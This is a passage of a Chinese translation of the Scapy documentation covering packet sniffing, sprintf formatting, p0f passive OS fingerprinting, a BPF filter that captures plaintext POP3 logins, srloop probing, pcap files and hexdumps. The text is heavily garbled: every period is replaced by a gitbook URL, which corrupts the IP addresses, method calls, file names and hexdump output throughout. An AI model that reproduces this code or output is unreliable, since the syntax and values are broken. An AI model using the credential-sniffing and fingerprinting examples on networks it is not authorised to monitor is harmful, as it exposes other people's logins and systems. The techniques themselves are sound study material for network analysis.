802https://wizardforcel.gitbooks.io/scapy-docs/content/11 / LLC / SNAP / ARP who has 172https://wizardforcel.gitbooks.io/scapy-docs/content/20https://wizardforcel.gitbooks.io/scapy-docs/content/70https://wizardforcel.gitbooks.io/scapy-docs/content/172 says 172https://wizardforcel.gitbooks.io/scapy-docs/content/20https://wizardforcel.gitbooks.io/scapy-docs/content/70https://wizardforcel.gitbooks.io/scapy-docs/content/171 / Padding
802https://wizardforcel.gitbooks.io/scapy-docs/content/11 / LLC / SNAP / ARP is at 00:0a:b7:4b:9c:dd says 172https://wizardforcel.gitbooks.io/scapy-docs/content/20https://wizardforcel.gitbooks.io/scapy-docs/content/70https://wizardforcel.gitbooks.io/scapy-docs/content/172 / Padding
802https://wizardforcel.gitbooks.io/scapy-docs/content/11 / LLC / SNAP / IP / ICMP echo-request 0 / Raw
802https://wizardforcel.gitbooks.io/scapy-docs/content/11 / LLC / SNAP / IP / ICMP echo-reply 0 / Raw
&gt;&gt;&gt; sniff(iface="eth1", prn=lambda x: xhttps://wizardforcel.gitbooks.io/scapy-docs/content/show())
---[ Ethernet ]---
dst = 00:ae:f3:52:aa:d1
src = 00:02:15:37:a2:44
type = 0x800
---[ IP ]---
version = 4L
ihl = 5L
tos = 0x0
len = 84
id = 0
flags = DF
frag = 0L
ttl = 64
proto = ICMP
chksum = 0x3831
src = 192https://wizardforcel.gitbooks.io/scapy-docs/content/168https://wizardforcel.gitbooks.io/scapy-docs/content/5https://wizardforcel.gitbooks.io/scapy-docs/content/21
dst = 66https://wizardforcel.gitbooks.io/scapy-docs/content/35https://wizardforcel.gitbooks.io/scapy-docs/content/250https://wizardforcel.gitbooks.io/scapy-docs/content/151
options = ''
---[ ICMP ]---
type = echo-request
code = 0
chksum = 0x89d9
id = 0xc245
seq = 0x0
---[ Raw ]---
load = 'B\xf7i\xa9\x00\x04\x149\x08\t\n\x0b\x0c\r\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f !\x22#$%&amp;\'()*+,-https://wizardforcel.gitbooks.io/scapy-docs/content/01234567'
---[ Ethernet ]---
dst = 00:02:15:37:a2:44
src = 00:ae:f3:52:aa:d1
type = 0x800
---[ IP ]---
version = 4L
ihl = 5L
tos = 0x0
len = 84
id = 2070
flags =
frag = 0L
ttl = 42
proto = ICMP
chksum = 0x861b
src = 66https://wizardforcel.gitbooks.io/scapy-docs/content/35https://wizardforcel.gitbooks.io/scapy-docs/content/250https://wizardforcel.gitbooks.io/scapy-docs/content/151
dst = 192https://wizardforcel.gitbooks.io/scapy-docs/content/168https://wizardforcel.gitbooks.io/scapy-docs/content/5https://wizardforcel.gitbooks.io/scapy-docs/content/21
options = ''
---[ ICMP ]---
type = echo-reply
code = 0
chksum = 0x91d9
id = 0xc245
seq = 0x0
---[ Raw ]---
load = 'B\xf7i\xa9\x00\x04\x149\x08\t\n\x0b\x0c\r\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f !\x22#$%&amp;\'()*+,-https://wizardforcel.gitbooks.io/scapy-docs/content/01234567'
---[ Padding ]---
load = '\n_\x00\x0b'</code></pre> 
<p>对于控制输出信息，我们可以使用<code>sprintf()</code>函数：</p> 
<pre><code>&gt;&gt;&gt; pkts = sniff(prn=lambda x:xhttps://wizardforcel.gitbooks.io/scapy-docs/content/sprintf("{IP:%IPhttps://wizardforcel.gitbooks.io/scapy-docs/content/src% -&gt; %IPhttps://wizardforcel.gitbooks.io/scapy-docs/content/dst%\n}{Raw:%Rawhttps://wizardforcel.gitbooks.io/scapy-docs/content/load%\n}"))
192https://wizardforcel.gitbooks.io/scapy-docs/content/168https://wizardforcel.gitbooks.io/scapy-docs/content/1https://wizardforcel.gitbooks.io/scapy-docs/content/100 -&gt; 64https://wizardforcel.gitbooks.io/scapy-docs/content/233https://wizardforcel.gitbooks.io/scapy-docs/content/167https://wizardforcel.gitbooks.io/scapy-docs/content/99

64https://wizardforcel.gitbooks.io/scapy-docs/content/233https://wizardforcel.gitbooks.io/scapy-docs/content/167https://wizardforcel.gitbooks.io/scapy-docs/content/99 -&gt; 192https://wizardforcel.gitbooks.io/scapy-docs/content/168https://wizardforcel.gitbooks.io/scapy-docs/content/1https://wizardforcel.gitbooks.io/scapy-docs/content/100

192https://wizardforcel.gitbooks.io/scapy-docs/content/168https://wizardforcel.gitbooks.io/scapy-docs/content/1https://wizardforcel.gitbooks.io/scapy-docs/content/100 -&gt; 64https://wizardforcel.gitbooks.io/scapy-docs/content/233https://wizardforcel.gitbooks.io/scapy-docs/content/167https://wizardforcel.gitbooks.io/scapy-docs/content/99

192https://wizardforcel.gitbooks.io/scapy-docs/content/168https://wizardforcel.gitbooks.io/scapy-docs/content/1https://wizardforcel.gitbooks.io/scapy-docs/content/100 -&gt; 64https://wizardforcel.gitbooks.io/scapy-docs/content/233https://wizardforcel.gitbooks.io/scapy-docs/content/167https://wizardforcel.gitbooks.io/scapy-docs/content/99
'GET / HTTP/1https://wizardforcel.gitbooks.io/scapy-docs/content/1\r\nHost: 64https://wizardforcel.gitbooks.io/scapy-docs/content/233https://wizardforcel.gitbooks.io/scapy-docs/content/167https://wizardforcel.gitbooks.io/scapy-docs/content/99\r\nUser-Agent: Mozilla/5https://wizardforcel.gitbooks.io/scapy-docs/content/0
(X11; U; Linux i686; en-US; rv:1https://wizardforcel.gitbooks.io/scapy-docs/content/8https://wizardforcel.gitbooks.io/scapy-docs/content/1https://wizardforcel.gitbooks.io/scapy-docs/content/8) Gecko/20071022 Ubuntu/7https://wizardforcel.gitbooks.io/scapy-docs/content/10 (gutsy)
Firefox/2https://wizardforcel.gitbooks.io/scapy-docs/content/0https://wizardforcel.gitbooks.io/scapy-docs/content/0https://wizardforcel.gitbooks.io/scapy-docs/content/8\r\nAccept: text/xml,application/xml,application/xhtml+xml,
text/html;q=0https://wizardforcel.gitbooks.io/scapy-docs/content/9,text/plain;q=0https://wizardforcel.gitbooks.io/scapy-docs/content/8,image/png,*/*;q=0https://wizardforcel.gitbooks.io/scapy-docs/content/5\r\nAccept-Language:
en-us,en;q=0https://wizardforcel.gitbooks.io/scapy-docs/content/5\r\nAccept-Encoding: gzip,deflate\r\nAccept-Charset:
ISO-8859-1,utf-8;q=0https://wizardforcel.gitbooks.io/scapy-docs/content/7,*;q=0https://wizardforcel.gitbooks.io/scapy-docs/content/7\r\nKeep-Alive: 300\r\nConnection:
keep-alive\r\nCache-Control: max-age=0\r\n\r\n'</code></pre> 
<p>我们可以嗅探并进行被动操作系统指纹识别：</p> 
<pre><code>&gt;&gt;&gt; p
&lt;Ether dst=00:10:4b:b3:7d:4e src=00:40:33:96:7b:60 type=0x800 |&lt;IP version=4L
ihl=5L tos=0x0 len=60 id=61681 flags=DF frag=0L ttl=64 proto=TCP chksum=0xb85e
src=192https://wizardforcel.gitbooks.io/scapy-docs/content/168https://wizardforcel.gitbooks.io/scapy-docs/content/8https://wizardforcel.gitbooks.io/scapy-docs/content/10 dst=192https://wizardforcel.gitbooks.io/scapy-docs/content/168https://wizardforcel.gitbooks.io/scapy-docs/content/8https://wizardforcel.gitbooks.io/scapy-docs/content/1 options='' |&lt;TCP sport=46511 dport=80
seq=2023566040L ack=0L dataofs=10L reserved=0L flags=SEC window=5840
chksum=0x570c urgptr=0 options=[('Timestamp', (342940201L, 0L)), ('MSS', 1460),
('NOP', ()), ('SAckOK', ''), ('WScale', 0)] |&gt;&gt;&gt;
&gt;&gt;&gt; load_module("p0f")
&gt;&gt;&gt; p0f(p)
(1https://wizardforcel.gitbooks.io/scapy-docs/content/0, ['Linux 2https://wizardforcel.gitbooks.io/scapy-docs/content/4https://wizardforcel.gitbooks.io/scapy-docs/content/2 - 2https://wizardforcel.gitbooks.io/scapy-docs/content/4https://wizardforcel.gitbooks.io/scapy-docs/content/14 (1)'])
&gt;&gt;&gt; a=sniff(prn=prnp0f)
(1https://wizardforcel.gitbooks.io/scapy-docs/content/0, ['Linux 2https://wizardforcel.gitbooks.io/scapy-docs/content/4https://wizardforcel.gitbooks.io/scapy-docs/content/2 - 2https://wizardforcel.gitbooks.io/scapy-docs/content/4https://wizardforcel.gitbooks.io/scapy-docs/content/14 (1)'])
(1https://wizardforcel.gitbooks.io/scapy-docs/content/0, ['Linux 2https://wizardforcel.gitbooks.io/scapy-docs/content/4https://wizardforcel.gitbooks.io/scapy-docs/content/2 - 2https://wizardforcel.gitbooks.io/scapy-docs/content/4https://wizardforcel.gitbooks.io/scapy-docs/content/14 (1)'])
(0https://wizardforcel.gitbooks.io/scapy-docs/content/875, ['Linux 2https://wizardforcel.gitbooks.io/scapy-docs/content/4https://wizardforcel.gitbooks.io/scapy-docs/content/2 - 2https://wizardforcel.gitbooks.io/scapy-docs/content/4https://wizardforcel.gitbooks.io/scapy-docs/content/14 (1)', 'Linux 2https://wizardforcel.gitbooks.io/scapy-docs/content/4https://wizardforcel.gitbooks.io/scapy-docs/content/10 (1)', 'Windows 98 (?)'])
(1https://wizardforcel.gitbooks.io/scapy-docs/content/0, ['Windows 2000 (9)'])</code></pre> 
<p>猜测操作系统版本前的数字为猜测的精确度。</p> 
<p>演示一下bpf过滤器和sprintf()方法：</p> 
<pre><code>&gt;&gt;&gt; a=sniff(filter="tcp and ( port 25 or port 110 )",
prn=lambda x: xhttps://wizardforcel.gitbooks.io/scapy-docs/content/sprintf("%IPhttps://wizardforcel.gitbooks.io/scapy-docs/content/src%:%TCPhttps://wizardforcel.gitbooks.io/scapy-docs/content/sport% -&gt; %IPhttps://wizardforcel.gitbooks.io/scapy-docs/content/dst%:%TCPhttps://wizardforcel.gitbooks.io/scapy-docs/content/dport% %2s,TCPhttps://wizardforcel.gitbooks.io/scapy-docs/content/flags% : %TCPhttps://wizardforcel.gitbooks.io/scapy-docs/content/payload%"))
192https://wizardforcel.gitbooks.io/scapy-docs/content/168https://wizardforcel.gitbooks.io/scapy-docs/content/8https://wizardforcel.gitbooks.io/scapy-docs/content/10:47226 -&gt; 213https://wizardforcel.gitbooks.io/scapy-docs/content/228https://wizardforcel.gitbooks.io/scapy-docs/content/0https://wizardforcel.gitbooks.io/scapy-docs/content/14:110 S :
213https://wizardforcel.gitbooks.io/scapy-docs/content/228https://wizardforcel.gitbooks.io/scapy-docs/content/0https://wizardforcel.gitbooks.io/scapy-docs/content/14:110 -&gt; 192https://wizardforcel.gitbooks.io/scapy-docs/content/168https://wizardforcel.gitbooks.io/scapy-docs/content/8https://wizardforcel.gitbooks.io/scapy-docs/content/10:47226 SA :
192https://wizardforcel.gitbooks.io/scapy-docs/content/168https://wizardforcel.gitbooks.io/scapy-docs/content/8https://wizardforcel.gitbooks.io/scapy-docs/content/10:47226 -&gt; 213https://wizardforcel.gitbooks.io/scapy-docs/content/228https://wizardforcel.gitbooks.io/scapy-docs/content/0https://wizardforcel.gitbooks.io/scapy-docs/content/14:110 A :
213https://wizardforcel.gitbooks.io/scapy-docs/content/228https://wizardforcel.gitbooks.io/scapy-docs/content/0https://wizardforcel.gitbooks.io/scapy-docs/content/14:110 -&gt; 192https://wizardforcel.gitbooks.io/scapy-docs/content/168https://wizardforcel.gitbooks.io/scapy-docs/content/8https://wizardforcel.gitbooks.io/scapy-docs/content/10:47226 PA : +OK &lt;13103https://wizardforcel.gitbooks.io/scapy-docs/content/1048117923@pop2-1https://wizardforcel.gitbooks.io/scapy-docs/content/freehttps://wizardforcel.gitbooks.io/scapy-docs/content/fr&gt;

192https://wizardforcel.gitbooks.io/scapy-docs/content/168https://wizardforcel.gitbooks.io/scapy-docs/content/8https://wizardforcel.gitbooks.io/scapy-docs/content/10:47226 -&gt; 213https://wizardforcel.gitbooks.io/scapy-docs/content/228https://wizardforcel.gitbooks.io/scapy-docs/content/0https://wizardforcel.gitbooks.io/scapy-docs/content/14:110 A :
192https://wizardforcel.gitbooks.io/scapy-docs/content/168https://wizardforcel.gitbooks.io/scapy-docs/content/8https://wizardforcel.gitbooks.io/scapy-docs/content/10:47226 -&gt; 213https://wizardforcel.gitbooks.io/scapy-docs/content/228https://wizardforcel.gitbooks.io/scapy-docs/content/0https://wizardforcel.gitbooks.io/scapy-docs/content/14:110 PA : USER toto

213https://wizardforcel.gitbooks.io/scapy-docs/content/228https://wizardforcel.gitbooks.io/scapy-docs/content/0https://wizardforcel.gitbooks.io/scapy-docs/content/14:110 -&gt; 192https://wizardforcel.gitbooks.io/scapy-docs/content/168https://wizardforcel.gitbooks.io/scapy-docs/content/8https://wizardforcel.gitbooks.io/scapy-docs/content/10:47226 A :
213https://wizardforcel.gitbooks.io/scapy-docs/content/228https://wizardforcel.gitbooks.io/scapy-docs/content/0https://wizardforcel.gitbooks.io/scapy-docs/content/14:110 -&gt; 192https://wizardforcel.gitbooks.io/scapy-docs/content/168https://wizardforcel.gitbooks.io/scapy-docs/content/8https://wizardforcel.gitbooks.io/scapy-docs/content/10:47226 PA : +OK

192https://wizardforcel.gitbooks.io/scapy-docs/content/168https://wizardforcel.gitbooks.io/scapy-docs/content/8https://wizardforcel.gitbooks.io/scapy-docs/content/10:47226 -&gt; 213https://wizardforcel.gitbooks.io/scapy-docs/content/228https://wizardforcel.gitbooks.io/scapy-docs/content/0https://wizardforcel.gitbooks.io/scapy-docs/content/14:110 A :
192https://wizardforcel.gitbooks.io/scapy-docs/content/168https://wizardforcel.gitbooks.io/scapy-docs/content/8https://wizardforcel.gitbooks.io/scapy-docs/content/10:47226 -&gt; 213https://wizardforcel.gitbooks.io/scapy-docs/content/228https://wizardforcel.gitbooks.io/scapy-docs/content/0https://wizardforcel.gitbooks.io/scapy-docs/content/14:110 PA : PASS tata

213https://wizardforcel.gitbooks.io/scapy-docs/content/228https://wizardforcel.gitbooks.io/scapy-docs/content/0https://wizardforcel.gitbooks.io/scapy-docs/content/14:110 -&gt; 192https://wizardforcel.gitbooks.io/scapy-docs/content/168https://wizardforcel.gitbooks.io/scapy-docs/content/8https://wizardforcel.gitbooks.io/scapy-docs/content/10:47226 PA : -ERR authorization failed

192https://wizardforcel.gitbooks.io/scapy-docs/content/168https://wizardforcel.gitbooks.io/scapy-docs/content/8https://wizardforcel.gitbooks.io/scapy-docs/content/10:47226 -&gt; 213https://wizardforcel.gitbooks.io/scapy-docs/content/228https://wizardforcel.gitbooks.io/scapy-docs/content/0https://wizardforcel.gitbooks.io/scapy-docs/content/14:110 A :
213https://wizardforcel.gitbooks.io/scapy-docs/content/228https://wizardforcel.gitbooks.io/scapy-docs/content/0https://wizardforcel.gitbooks.io/scapy-docs/content/14:110 -&gt; 192https://wizardforcel.gitbooks.io/scapy-docs/content/168https://wizardforcel.gitbooks.io/scapy-docs/content/8https://wizardforcel.gitbooks.io/scapy-docs/content/10:47226 FA :
192https://wizardforcel.gitbooks.io/scapy-docs/content/168https://wizardforcel.gitbooks.io/scapy-docs/content/8https://wizardforcel.gitbooks.io/scapy-docs/content/10:47226 -&gt; 213https://wizardforcel.gitbooks.io/scapy-docs/content/228https://wizardforcel.gitbooks.io/scapy-docs/content/0https://wizardforcel.gitbooks.io/scapy-docs/content/14:110 FA :
213https://wizardforcel.gitbooks.io/scapy-docs/content/228https://wizardforcel.gitbooks.io/scapy-docs/content/0https://wizardforcel.gitbooks.io/scapy-docs/content/14:110 -&gt; 192https://wizardforcel.gitbooks.io/scapy-docs/content/168https://wizardforcel.gitbooks.io/scapy-docs/content/8https://wizardforcel.gitbooks.io/scapy-docs/content/10:47226 A :</code></pre> 
<p>这儿有一个例子来实现类似(h)ping的功能：你一直发送同样的数据包集合来观察是否发生变化：</p> 
<pre><code>&gt;&gt;&gt; srloop(IP(dst="wwwhttps://wizardforcel.gitbooks.io/scapy-docs/content/targethttps://wizardforcel.gitbooks.io/scapy-docs/content/com/30")/TCP())
RECV 1: Ether / IP / TCP 192https://wizardforcel.gitbooks.io/scapy-docs/content/168https://wizardforcel.gitbooks.io/scapy-docs/content/11https://wizardforcel.gitbooks.io/scapy-docs/content/99:80 &gt; 192https://wizardforcel.gitbooks.io/scapy-docs/content/168https://wizardforcel.gitbooks.io/scapy-docs/content/8https://wizardforcel.gitbooks.io/scapy-docs/content/14:20 SA / Padding
fail 3: IP / TCP 192https://wizardforcel.gitbooks.io/scapy-docs/content/168https://wizardforcel.gitbooks.io/scapy-docs/content/8https://wizardforcel.gitbooks.io/scapy-docs/content/14:20 &gt; 192https://wizardforcel.gitbooks.io/scapy-docs/content/168https://wizardforcel.gitbooks.io/scapy-docs/content/11https://wizardforcel.gitbooks.io/scapy-docs/content/96:80 S
IP / TCP 192https://wizardforcel.gitbooks.io/scapy-docs/content/168https://wizardforcel.gitbooks.io/scapy-docs/content/8https://wizardforcel.gitbooks.io/scapy-docs/content/14:20 &gt; 192https://wizardforcel.gitbooks.io/scapy-docs/content/168https://wizardforcel.gitbooks.io/scapy-docs/content/11https://wizardforcel.gitbooks.io/scapy-docs/content/98:80 S
IP / TCP 192https://wizardforcel.gitbooks.io/scapy-docs/content/168https://wizardforcel.gitbooks.io/scapy-docs/content/8https://wizardforcel.gitbooks.io/scapy-docs/content/14:20 &gt; 192https://wizardforcel.gitbooks.io/scapy-docs/content/168https://wizardforcel.gitbooks.io/scapy-docs/content/11https://wizardforcel.gitbooks.io/scapy-docs/content/97:80 S
RECV 1: Ether / IP / TCP 192https://wizardforcel.gitbooks.io/scapy-docs/content/168https://wizardforcel.gitbooks.io/scapy-docs/content/11https://wizardforcel.gitbooks.io/scapy-docs/content/99:80 &gt; 192https://wizardforcel.gitbooks.io/scapy-docs/content/168https://wizardforcel.gitbooks.io/scapy-docs/content/8https://wizardforcel.gitbooks.io/scapy-docs/content/14:20 SA / Padding
fail 3: IP / TCP 192https://wizardforcel.gitbooks.io/scapy-docs/content/168https://wizardforcel.gitbooks.io/scapy-docs/content/8https://wizardforcel.gitbooks.io/scapy-docs/content/14:20 &gt; 192https://wizardforcel.gitbooks.io/scapy-docs/content/168https://wizardforcel.gitbooks.io/scapy-docs/content/11https://wizardforcel.gitbooks.io/scapy-docs/content/96:80 S
IP / TCP 192https://wizardforcel.gitbooks.io/scapy-docs/content/168https://wizardforcel.gitbooks.io/scapy-docs/content/8https://wizardforcel.gitbooks.io/scapy-docs/content/14:20 &gt; 192https://wizardforcel.gitbooks.io/scapy-docs/content/168https://wizardforcel.gitbooks.io/scapy-docs/content/11https://wizardforcel.gitbooks.io/scapy-docs/content/98:80 S
IP / TCP 192https://wizardforcel.gitbooks.io/scapy-docs/content/168https://wizardforcel.gitbooks.io/scapy-docs/content/8https://wizardforcel.gitbooks.io/scapy-docs/content/14:20 &gt; 192https://wizardforcel.gitbooks.io/scapy-docs/content/168https://wizardforcel.gitbooks.io/scapy-docs/content/11https://wizardforcel.gitbooks.io/scapy-docs/content/97:80 S
RECV 1: Ether / IP / TCP 192https://wizardforcel.gitbooks.io/scapy-docs/content/168https://wizardforcel.gitbooks.io/scapy-docs/content/11https://wizardforcel.gitbooks.io/scapy-docs/content/99:80 &gt; 192https://wizardforcel.gitbooks.io/scapy-docs/content/168https://wizardforcel.gitbooks.io/scapy-docs/content/8https://wizardforcel.gitbooks.io/scapy-docs/content/14:20 SA / Padding
fail 3: IP / TCP 192https://wizardforcel.gitbooks.io/scapy-docs/content/168https://wizardforcel.gitbooks.io/scapy-docs/content/8https://wizardforcel.gitbooks.io/scapy-docs/content/14:20 &gt; 192https://wizardforcel.gitbooks.io/scapy-docs/content/168https://wizardforcel.gitbooks.io/scapy-docs/content/11https://wizardforcel.gitbooks.io/scapy-docs/content/96:80 S
IP / TCP 192https://wizardforcel.gitbooks.io/scapy-docs/content/168https://wizardforcel.gitbooks.io/scapy-docs/content/8https://wizardforcel.gitbooks.io/scapy-docs/content/14:20 &gt; 192https://wizardforcel.gitbooks.io/scapy-docs/content/168https://wizardforcel.gitbooks.io/scapy-docs/content/11https://wizardforcel.gitbooks.io/scapy-docs/content/98:80 S
IP / TCP 192https://wizardforcel.gitbooks.io/scapy-docs/content/168https://wizardforcel.gitbooks.io/scapy-docs/content/8https://wizardforcel.gitbooks.io/scapy-docs/content/14:20 &gt; 192https://wizardforcel.gitbooks.io/scapy-docs/content/168https://wizardforcel.gitbooks.io/scapy-docs/content/11https://wizardforcel.gitbooks.io/scapy-docs/content/97:80 S
RECV 1: Ether / IP / TCP 192https://wizardforcel.gitbooks.io/scapy-docs/content/168https://wizardforcel.gitbooks.io/scapy-docs/content/11https://wizardforcel.gitbooks.io/scapy-docs/content/99:80 &gt; 192https://wizardforcel.gitbooks.io/scapy-docs/content/168https://wizardforcel.gitbooks.io/scapy-docs/content/8https://wizardforcel.gitbooks.io/scapy-docs/content/14:20 SA / Padding
fail 3: IP / TCP 192https://wizardforcel.gitbooks.io/scapy-docs/content/168https://wizardforcel.gitbooks.io/scapy-docs/content/8https://wizardforcel.gitbooks.io/scapy-docs/content/14:20 &gt; 192https://wizardforcel.gitbooks.io/scapy-docs/content/168https://wizardforcel.gitbooks.io/scapy-docs/content/11https://wizardforcel.gitbooks.io/scapy-docs/content/96:80 S
IP / TCP 192https://wizardforcel.gitbooks.io/scapy-docs/content/168https://wizardforcel.gitbooks.io/scapy-docs/content/8https://wizardforcel.gitbooks.io/scapy-docs/content/14:20 &gt; 192https://wizardforcel.gitbooks.io/scapy-docs/content/168https://wizardforcel.gitbooks.io/scapy-docs/content/11https://wizardforcel.gitbooks.io/scapy-docs/content/98:80 S
IP / TCP 192https://wizardforcel.gitbooks.io/scapy-docs/content/168https://wizardforcel.gitbooks.io/scapy-docs/content/8https://wizardforcel.gitbooks.io/scapy-docs/content/14:20 &gt; 192https://wizardforcel.gitbooks.io/scapy-docs/content/168https://wizardforcel.gitbooks.io/scapy-docs/content/11https://wizardforcel.gitbooks.io/scapy-docs/content/97:80 S</code></pre> 
<h4 id="articleHeader0">PCAP</h4> 
<p>通常可以将数据包保存为pcap文件以备后用，或者是供其他的应用程序使用：</p> 
<pre><code class="language-html"> </code></pre> 
<ol><li> <pre><code>&gt;&gt;&gt; wrpcap("temphttps://wizardforcel.gitbooks.io/scapy-docs/content/cap",pkts)</code></pre> <p> </p> </li></ol> 
<p>还原之前保存的pcap文件：</p> 
<pre><code class="language-html"> </code></pre> 
<ol><li> <pre><code>&gt;&gt;&gt; pkts = rdpcap("temphttps://wizardforcel.gitbooks.io/scapy-docs/content/cap")</code></pre> <p> </p> </li></ol> 
<p>或者</p> 
<pre><code class="language-html"> </code></pre> 
<ol><li> <pre><code>&gt;&gt;&gt; pkts = rdpcap("temphttps://wizardforcel.gitbooks.io/scapy-docs/content/cap")</code></pre> <p> </p> </li></ol> 
<h4 id="articleHeader1">Hexdump</h4> 
<p>Scapy允许你以不同的十六进制格式输出编码的数据包。</p> 
<p>使用<code>hexdump()</code>函数会以经典的hexdump格式输出数据包：</p> 
<pre><code>&gt;&gt;&gt; hexdump(pkt)
0000 00 50 56 FC CE 50 00 0C 29 2B 53 19 08 00 45 00 https://wizardforcel.gitbooks.io/scapy-docs/content/PVhttps://wizardforcel.gitbooks.io/scapy-docs/content/https://wizardforcel.gitbooks.io/scapy-docs/content/Phttps://wizardforcel.gitbooks.io/scapy-docs/content/https://wizardforcel.gitbooks.io/scapy-docs/content/)+Shttps://wizardforcel.gitbooks.io/scapy-docs/content/https://wizardforcel.gitbooks.io/scapy-docs/content/https://wizardforcel.gitbooks.io/scapy-docs/content/Ehttps://wizardforcel.gitbooks.io/scapy-docs/content/
0010 00 54 00 00 40 00 40 01 5A 7C C0 A8 19 82 04 02 https://wizardforcel.gitbooks.io/scapy-docs/content/Thttps://wizardforcel.gitbooks.io/scapy-docs/content/https://wizardforcel.gitbooks.io/scapy-docs/content/@https://wizardforcel.gitbooks.io/scapy-docs/content/@https://wizardforcel.gitbooks.io/scapy-docs/content/Z|https://wizardforcel.gitbooks.io/scapy-docs/content/https://wizardforcel.gitbooks.io/scapy-docs/content/https://wizardforcel.gitbooks.io/scapy-docs/content/https://wizardforcel.gitbooks.io/scapy-docs/content/https://wizardforcel.gitbooks.io/scapy-docs/content/https://wizardforcel.gitbooks.io/scapy-docs/content/
0020 02 01 08 00 9C 90 5A 61 00 01 E6 DA 70 49 B6 E5 https://wizardforcel.gitbooks.io/scapy-docs/content/https://wizardforcel.gitbooks.io/scapy-docs/content/https://wizardforcel.gitbooks.io/scapy-docs/content/https://wizardforcel.gitbooks.io/scapy-docs/content/https://wizardforcel.gitbooks.io/scapy-docs/content/https://wizardforcel.gitbooks.io/scapy-docs/content/Zahttps://wizardforcel.gitbooks.io/scapy-docs/content/https://wizardforcel.gitbooks.io/scapy-docs/content/https://wizardforcel.gitbooks.io/scapy-docs/content/https://wizardforcel.gitbooks.io/scapy-docs/content/pIhttps://wizardforcel.gitbooks.io/scapy-docs/content/https://wizardforcel.gitbooks.io/scapy-docs/content/
0030 08 00 08 09 0A 0B 0C 0D 0E 0F 10 11 12 13 14 15 https://wizardforcel.gitbooks.io/scapy-docs/content/https://wizardforcel.gitbooks.io/scapy-docs/content/https://wizardforcel.gitbooks.io/scapy-docs/content/https://wizardforcel.gitbooks.io/scapy-docs/content/https://wizardforcel.gitbooks.io/scapy-docs/content/https://wizardforcel.gitbooks.io/scapy-docs/content/https://wizardforcel.gitbooks.io/scapy-docs/content/https://wizardforcel.gitbooks.io/scapy-docs/content/https://wizardforcel.gitbooks.io/scapy-docs/content/https://wizardforcel.gitbooks.io/scapy-docs/content/https://wizardforcel.gitbooks.io/scapy-docs/content/https://wizardforcel.gitbooks.io/scapy-docs/content/https://wizardforcel.gitbooks.io/scapy-docs/content/https://wizardforcel.gitbooks.io/scapy-docs/content/https://wizardforcel.gitbooks.io/scapy-docs/content/https://wizardforcel.gitbooks.io/scapy-docs/content/
0040 16 17 18 19 1A 1B 1C 1D 1E 1F 20 21 22 23 24 25 https://wizardforcel.gitbooks.io/scapy-docs/content/https://wizardforcel.gitbooks.io/scapy-docs/content/https://wizardforcel.gitbooks.io/scapy-docs/content/https://wizardforcel.gitbooks.io/scapy-docs/content/https://wizardforcel.gitbooks.io/scapy-docs/content/https://wizardforcel.gitbooks.io/scapy-docs/content/https://wizardforcel.gitbooks.io/scapy-docs/content/https://wizardforcel.gitbooks.io/scapy-docs/content/https://wizardforcel.gitbooks.io/scapy-docs/content/https://wizardforcel.gitbooks.io/scapy-docs/content/ !"#$%
0050 26 27 28 29 2A 2B 2C 2D 2E 2F 30 31 32 33 34 35 &amp;'()*+,-https://wizardforcel.gitbooks.io/scapy-docs/content/012345
0060 36 37 67</code></pre> 
<p>使用<code>import_hexcap()</code>函数可以将以上的hexdump重新导入到Scapy中：</p> 
<pre><code>&gt;&gt;&gt; pkt_hex = Ether(import_hexcap())
0000 00 50 56 FC CE 50 00 0C 29 2B 53 19 08 00 45 00 https://wizardforcel.gitbooks.io/scapy-docs/content/PVhttps://wizardforcel.gitbooks.io/scapy-docs/content/https://wizardforcel.gitbooks.io/scapy-docs/content/Phttps://wizardforcel.gitbooks.io/scapy-docs/content/https://wizardforcel.gitbooks.io/scapy-docs/content/)+Shttps://wizardforcel.gitbooks.io/scapy-docs/content/https://wizardforcel.gitbooks.io/scapy-docs/content/https://wizardforcel.gitbooks.io/scapy-docs/content/Ehttps://wizardforcel.gitbooks.io/scapy-docs/content/
0010 00 54 00 00 40 00 40 01 5A 7C C0 A8 19 82 04 02 https://wizardforcel.gitbooks.io/scapy-docs/content/Thttps://wizardforcel.gitbooks.io/scapy-docs/content/https://wizardforcel.gitbooks.io/scapy-docs/content/@https://wizardforcel.gitbooks.io/scapy-docs/content/@https://wizardforcel.gitbooks.io/scapy-docs/content/Z|https://wizardforcel.gitbooks.io/scapy-docs/content/https://wizardforcel.gitbooks.io/scapy-docs/content/https://wizardforcel.gitbooks.io/scapy-docs/content/https://wizardforcel.gitbooks.io/scapy-docs/content/https://wizardforcel.gitbooks.io/scapy-docs/content/https://wizardforcel.gitbooks.io/scapy-docs/content/
0020 02 01 08 00 9C 90 5A 61 00 01 E6 DA 70 49 B6 E5 https://wizardforcel.gitbooks.io/scapy-docs/content/https://wizardforcel.gitbooks.io/scapy-docs/content/https://wizardforcel.gitbooks.io/scapy-docs/content/https://wizardforcel.gitbooks.io/scapy-docs/content/https://wizardforcel.gitbooks.io/scapy-docs/content/https://wizardforcel.gitbooks.io/scapy-docs/content/Zahttps://wizardforcel.gitbooks.io/scapy-docs/content/https://wizardforcel.gitbooks.io/scapy-docs/content/https://wizardforcel.gitbooks.io/scapy-docs/content/https://wizardforcel.gitbooks.io/scapy-docs/content/pIhttps://wizardforcel.gitbooks.io/scapy-docs/content/https://wizardforcel.gitbooks.io/scapy-docs/content/
0030 08 00 08 09 0A 0B 0C 0D 0E 0F 10 11 12 13 14 15 https://wizardforcel.gitbooks.io/scapy-docs/content/https://wizardforcel.gitbooks.io/scapy-docs/content/https://wizardforcel.gitbooks.io/scapy-docs/content/https://wizardforcel.gitbooks.io/scapy-docs/content/https://wizardforcel.gitbooks.io/scapy-docs/content/https://wizardforcel.gitbooks.io/scapy-docs/content/https://wizardforcel.gitbooks.io/scapy-docs/content/https://wizardforcel.gitbooks.io/scapy-docs/content/https://wizardforcel.gitbooks.io/scapy-docs/content/https://wizardforcel.gitbooks.io/scapy-docs/content/https://wizardforcel.gitbooks.io/scapy-docs/content/https://wizardforcel.gitbooks.io/scapy-docs/content/https://wizardforcel.gitbooks.io/scapy-docs/content/https://wizardforcel.gitbooks.io/scapy-docs/content/https://wizardforcel.gitbooks.io/scapy-docs/content/https://wizardforcel.gitbooks.io/scapy-docs/content/
